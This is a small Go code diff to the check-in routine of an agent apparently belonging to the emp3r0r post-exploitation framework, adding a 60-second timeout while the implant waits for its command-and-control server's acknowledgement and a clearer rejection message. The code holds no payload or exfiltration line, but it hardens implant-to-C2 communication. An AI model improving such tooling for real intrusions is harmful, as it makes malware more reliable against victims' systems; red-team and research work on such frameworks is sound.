@@ -53,13 +53,34 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 	// Wait for ACK from server
 	// This ensures the server has processed our check-in before we close the connection
 	// especially important for polling-based transports like http_poll
+	// Timeout matters: if the CC rejects the checkin (duplicate session, etc.)
+	// without replying, an indefinite decode would hang the agent forever.
 	dec := cbor.NewDecoder(secureConn)
+	type ackResult struct {
+		ack def.MsgTunData
+		err error
+	}
+	ackCh := make(chan ackResult, 1)
+	go func() {
+		var ack def.MsgTunData
+		if e := dec.Decode(&ack); e != nil {
+			ackCh <- ackResult{err: e}
+			return
+		}
+		ackCh <- ackResult{ack: ack}
+	}()
 	var ack def.MsgTunData
-	if err = dec.Decode(&ack); err != nil {
-		return fmt.Errorf("decode checkin ACK: %v", err)
+	select {
+	case res := <-ackCh:
+		if res.err != nil {
+			return fmt.Errorf("decode checkin ACK: %v", res.err)
+		}
+		ack = res.ack
+	case <-time.After(60 * time.Second):
+		return fmt.Errorf("checkin ACK timeout (60s): CC did not respond")
 	}
 	if ack.Tag != "checkin-ok" {
-		return fmt.Errorf("invalid checkin ACK tag: %s", ack.Tag)
+		return fmt.Errorf("checkin rejected: %s (%s)", ack.Tag, string(ack.Response))
 	}
 
 	logging.Infof("Checked in (verified by server)")
